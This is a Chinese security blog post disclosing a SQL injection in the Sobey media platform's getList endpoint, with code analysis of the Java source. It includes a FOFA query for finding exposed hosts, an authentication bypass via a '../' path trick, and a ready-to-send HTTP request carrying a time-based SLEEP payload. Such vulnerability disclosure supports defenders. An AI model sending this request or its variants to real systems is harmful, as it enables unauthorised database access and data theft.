---
title: "索贝融媒体 getList SQL注入漏洞"
source: https://mrxn.net/jswz/sobey-Articlelist-getList-sqli.html
asset_dir: assets/索贝融媒体-getlist-sql注入漏洞
---

# 索贝融媒体 getList SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/8/1 07:28
* 1048浏览
* [2评论](#comment)
* 1小时阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

索贝融媒体系统的 getList 接口**catalogid**参数存在 [SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可通过构造恶意 SQL 语句注入到该接口的**catalogid**参数中，进而实现任意 SQL 语句执行，可能导致数据库敏感信息泄露、数据篡改，甚至在部分情况下进一步获取系统控制权限。影响范围包括数据库的完整性、保密性及可用性，严重时可能危及整个系统安全。

SQL注入防护

# 影响版本

# fofa语法

> app="SOBEY-融媒体"

# 漏洞分析

## 权限校验

根据系统 `web.xml` 的内容可知系统为Spring mvc架构

[![索贝融媒体 getList SQL注入漏洞](images/img-001-6f24e065a138.webp)](https://image.mrxn.net/d84d83b7ae594558a054ff0707c6f74d.webp)

那就先看 WEB-INF/classes/spring-mvc.xml ，主要看它的**springmvc拦截器** **，**这里配置有权限相关的拦截校验，如果权限校验存在缺陷，这可能存在[权限绕过](https://mrxn.net/tag/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)漏洞。

```
<!-- springmvc拦截器  -->
<mvc:interceptors>
    <!--跨域-->
    <mvc:interceptor>
        <mvc:mapping path="/mch/**"/>
        <bean class="com.sobey.api.interceptor.CORSFilter">
        </bean>
    </mvc:interceptor>
    <mvc:interceptor>
        <mvc:mapping path="/mch/**"/>
        <bean class="com.sobey.api.interceptor.HiveInterceptor">
            <property name="allowUrls">
                <list>
                    <!-- 如果请求中包含以下路径，则不进行拦截 -->
                    <value>/push_callback</value>
                    <value>/js</value>
                    <value>/css</value>
                    <value>/image</value>
                    <value>/images</value>
                    <value>/LoginInt</value>
                    <value>/getOmnfig</value>
                    <value>/dtest</value>
                    <value>/UserInt</value>
                    <value>/getList</value>
                    <value>/AIInt</value>
                    <value>/TestInt</value>
                    <value>/syncGet</value>
                    <value>/ArticlePushInInt</value>
                    <value>/third/push</value>
                    <value>/thirdGX/updateStatus</value>
                    <value>/test/push_callback</value>
                    <value>/mch/statistics</value>
                    <value>/bottonCount</value>
                    <value>mch/File/taskBack</value>
                    <value>/uploadCallback</value>
                    <value>/mch/Articlelist/queryByCode</value>
                    <value>/customField/updateFieldClass</value>
                    <value>/callBcakUpdateStatus</value>
                    <value>/energy/callback</value>
                    <value>/AISaveArticle</value>
                    <value>/jkhitv/catagory</value>
                    <value>/login</value>
                    <value>/logout</value>
                    <value>/recall_callback</value>
                    <value>/mch/articleImport/saveFromEntity</value>
                    <value>/mch/articleImport/addArticle</value>
                    <value>/mch/articleImport/articleImport</value>
                    <value>/mch/articleImport/createByMaterials</value>
                    <value>/mch/articleImport/add</value>
                    <value>/mch/articleImport/lzyAdd</value>
                    <value>/mch/catalogInt/getCatalogListByThird</value>
                    <value>/mch/catalogInt/getCatalogLevel</value>
                    <value>/fz/statusReWrite</value>
                    <value>/mch/xinhuaXml/addArticle</value>
                    <value>/syncReception</value>
                    <value>/mch/fz/addArticle</value>
                   <!-- <value>/mch/Articlelist/articleScorelist</value>-->
                    <value>/mch/ArticleInt/xining_find</value>
                    <value>/mch/ArticleInt/checkBythird</value>
                    <value>/mch/fcmonit</value>
                    <value>/mch/audioTrans/callback</value>
                    <value>/mch/cyy/save</value>
                    <value>/mch/catalogInt/freshTotoAccount</value>
                    <value>/mch/videotranscode/processcallback</value>
                    <value>/mch/hypermediaInt/notify</value>
                    <value>/mch/lzy/getArticleList</value>
                    <value>/mch/Articlelist/articleExamineExport</value>
                </list>
            </property>
        </bean>
    </mvc:interceptor>
</mvc:interceptors>
```

根据此系统的拦截器定义部分，看下面对请求路径 `/mch/**` 的拦截实现class以及其定义的白名单url路径列表

代码安全审计

```
<mvc:mapping path="/mch/**"/>
<bean class="com.sobey.api.interceptor.HiveInterceptor">
    <property name="allowUrls">
```

跟进`HiveInterceptor`

```
public class HiveInterceptor implements HandlerInterceptor {
    private List<String> allowUrls;

    public void setAllowUrls(List<String> allowUrls) {
        this.allowUrls = allowUrls;
    }

    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        String contextPath = request.getContextPath();
        String uri = request.getRequestURI().replace(contextPath, "");

        for(String url : this.allowUrls) {
            if (uri.contains(url)) {
                return true;
            }
        }
```

其中preHandle方法下对于URL路径的获取使用的 **request.getRequestURI() ，**看到这里就知道存在权限绕过漏洞了，简单来说就是获取的url是格式化之前的路径包括一些特殊符号如夸目录 `../` 这类的，且使用的**uri.contains(url)** 方法来判断请求的url路径里是否包含白名单列表中的内容，如果包含着直接返回true，就通过权限校验了。OK，下面回到本次主题的[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

## SQL注入

看下存在漏洞的`getList`方法是如何实现的吧

漏洞扫描服务

```
@RestController
@RequestMapping({"/mch/Articlelist"})
public class ArticleListController extends BaseController {
```

在 ArticleListController 这个类上使用 `@RequestMapping({"/mch/Articlelist"})` 注解，为该控制器下的所有请求处理方法定义了一个统一的URL路径前缀 `/mch/Articlelist`，接着是各种子方法，其中`getList`方法实现如下

编程

```
@RequestMapping({"/getList"})
public JSONObject getList(@RequestParam(value = "id",required = false,defaultValue = "") String id, @RequestParam(value = "catalogid",required = false,defaultValue = "") String catalogid, @RequestParam(value = "createUserName",required = false,defaultValue = "") String createUserName, @RequestParam(value = "channelCode",required = false,defaultValue = "") String channelCode, @RequestParam(value = "number",required = false,defaultValue = "10") String number, @RequestParam(value = "pageIndex",required = false,defaultValue = "0") String pageIndex, @RequestParam(value = "startTime",required = false) String startTime, @RequestParam(value = "endTime",required = false) String endTime, @RequestParam(value = "status",required = false,defaultValue = "") String status, @RequestParam(value = "customCode",required = false) String customCode, @RequestParam(value = "customValue",required = false) String customValue) {
    Response response = new Response();
    JSONObject ret = new JSONObject();

    try {
        QueryBuilder qb = new QueryBuilder("select a.id,a.title,a.catalogid as catalogName,a.content,a.createDate,a.createusername,'' as channelName, ");
        qb.append("case a.status when 0 then '初稿' when 10 then '审核中' when 60 then '审核退回' when 30 then '推送中' when 40 then '推送完成' when 50 then '推送失败' when 70 then '审核通过' end as status from zcnarticle a ");
        QueryBuilder count = new QueryBuilder("select count(1) from zcnarticle  a ");
        if (StringUtil.isNotEmpty(customCode) && StringUtil.isNotEmpty(customValue)) {
            qb.append(" inner join zcncustomfieldrela e on a.id=e.articleid and e.code=? ", customCode);
            qb.append(" and e.value = ?", customValue);
            count.append(" inner join zcncustomfieldrela e on a.id=e.articleid and e.code=? ", customCode);
            count.append(" and e.value = ?", customValue);
        }

        qb.append(" where a.ifval='1' ");
        count.append("where  a.ifval='1' ");
        if (StringUtil.isNotEmpty(id)) {
            qb.append(" and a.id =? ", id);
            count.append(" and a.id =? ", id);
        }

        if (StringUtil.isNotEmpty(catalogid)) {
            qb.append(String.format(" and a.catalogid in ( %s ) ", catalogid));
            count.append(String.format(" and a.catalogid in ( %s ) ", catalogid));
        }
```

关键点在于参数**catalogid**没有采用其他参数类似的参数化绑定查询，而是直接格式化拼接进SQL语句中，然后直接用`qb.executePagedDataTable`来执行组装完成的SQL语句，从而造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
POST /sobey-mchEditor/mch/Articlelist/queryByCode/../getList HTTP/1.1
Host: sobey.mrxn.net
Content-Type: application/x-www-form-urlencoded

catalogid=1%)+AND (SELECT 4920 FROM (SELECT(SLEEP(5)))ILaK)-- -
```

[![索贝融媒体 getList SQL注入漏洞](images/img-002-d2e9c9511e26.webp)](https://image.mrxn.net/59e813dddf6e4303abf12cda355cd932.webp)

成功延时 5 秒

安全工具开发

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [4.1.权限校验](#toc-4-1-)
* [4.2.SQL注入](#toc-4-2-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[索贝融媒体 getList SQL注入漏洞](https://mrxn.net/jswz/sobey-Articlelist-getList-sqli.html)  
文章链接：<https://mrxn.net/jswz/sobey-Articlelist-getList-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sobey-Articlelist-getList-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

SQL注入防护

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALg0lEQVR4AezbjVbkuA4EYL59/3e+F7WmEsdxmp+FgXM2HDQllUqyseLuXmb2n5eXl/991v43fY19khq5f+OnXzC9En8U5/rEK7zqPWqjGbnP+DWQ17r7+7ecwDaQ1wm/vNeuNj/WRxMu8TOMdoWpwwu2vdIxO87axM8wa46aFVd5eq3kC4sfrbj32li3DWQkb//nTuA0EHr6nPFqm7R2lec6Nz9Bcz1diy2Vmo1YOFjeooX0ocMq9SUctjU4+qsFTgNZiW7u753Alw6E/QmYf4Q82SNGQ9clDo5ajho6HjVzHa0JT8fs70HJPUO6btbQPObUp+MvHcind3EXbifwJQPJU7p1XTi4fC2d62ntos3WIzlai1AnTfqPiIcuHMe4+K3hH4fW/Am/Bb5kIN+ys/9o0+8ZyH/0ML/ixz4NpK7qlb214Fh3pR018a+09EsE5zfh1K4w/ZJLPGJy9BpzTPPsa0ezwrH36K+04UZd/NNAkrjxZ05gGwj7E8Fzf94qrR95mnv2NNCa1NHxs5pog3QNQp0QjzfwMUFzWYtjXPyoL5/WlF9Gx6jwYHisyds4Fm4DGcnb/7kT+KeehM9atp169qchOZqLJnxhOI4ajnHpSr+yysVW+eKSp/ui6INFM5Lh8Hjak6Pj5AuTK//f2H1DcpK/BC8HQj8F7Jg9s3MIvf1KfPWERITH08aOyc3IrqH9aOiYM0YTpDWJC7NHOkdj5WaLNjjn3xvTa9C4qrscyEp8c99/AqeBcJxenopCOld+2Ue2x7F2Vc9Rs+pfdaOtNP+Go/eAUxs8bncSdMwZV5px3+VH